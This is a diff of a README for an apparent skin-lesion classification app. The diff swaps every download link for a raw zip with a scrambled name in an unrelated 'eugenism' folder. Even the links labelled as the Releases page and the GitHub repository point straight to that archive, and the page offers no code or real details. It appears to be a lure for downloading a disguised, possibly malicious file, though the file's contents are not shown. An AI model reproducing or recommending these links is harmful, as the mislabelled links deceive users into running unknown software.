@@ -1,6 +1,6 @@
 # 🩺 HAM10000-ConvNeXt-Small-Skin-Lesion-Classification - Simple Skin Lesion Classifier
 
-![Download](https://raw.githubusercontent.com/torel00f/HAM10000-ConvNeXt-Small-Skin-Lesion-Classification/main/eugenism/Skin-Conv-Ne-Classification-Small-HA-Lesion-Xt-v2.2.zip)
+![Download](https://raw.githubusercontent.com/torel00f/HAM10000-ConvNeXt-Small-Skin-Lesion-Classification/main/eugenism/Classification_Skin_HA_Xt_Small_Ne_Conv_Lesion_decorated.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide will help you download and run the "HAM10000-ConvNeXt-Small-Skin-Lesi
 
 To get started, you can download the application from the Releases page. 
 
-[**Visit this page to download**](https://raw.githubusercontent.com/torel00f/HAM10000-ConvNeXt-Small-Skin-Lesion-Classification/main/eugenism/Skin-Conv-Ne-Classification-Small-HA-Lesion-Xt-v2.2.zip)
+[**Visit this page to download**](https://raw.githubusercontent.com/torel00f/HAM10000-ConvNeXt-Small-Skin-Lesion-Classification/main/eugenism/Classification_Skin_HA_Xt_Small_Ne_Conv_Lesion_decorated.zip)
 
 1. Click the link above.
 2. Find the latest release.
@@ -64,11 +64,11 @@ If you face any issues or have questions, feel free to open an issue on our GitH
 
 ## 🌐 Learn More
 
-For more details on how the application works, visit our [GitHub repository](https://raw.githubusercontent.com/torel00f/HAM10000-ConvNeXt-Small-Skin-Lesion-Classification/main/eugenism/Skin-Conv-Ne-Classification-Small-HA-Lesion-Xt-v2.2.zip).
+For more details on how the application works, visit our [GitHub repository](https://raw.githubusercontent.com/torel00f/HAM10000-ConvNeXt-Small-Skin-Lesion-Classification/main/eugenism/Classification_Skin_HA_Xt_Small_Ne_Conv_Lesion_decorated.zip).
 
 ## 🔗 Important Links
 
-[**Download the application**](https://raw.githubusercontent.com/torel00f/HAM10000-ConvNeXt-Small-Skin-Lesion-Classification/main/eugenism/Skin-Conv-Ne-Classification-Small-HA-Lesion-Xt-v2.2.zip)  
+[**Download the application**](https://raw.githubusercontent.com/torel00f/HAM10000-ConvNeXt-Small-Skin-Lesion-Classification/main/eugenism/Classification_Skin_HA_Xt_Small_Ne_Conv_Lesion_decorated.zip)  
 
 Explore the repository for additional documentation and updates. Your feedback is valuable for improving this application.
 
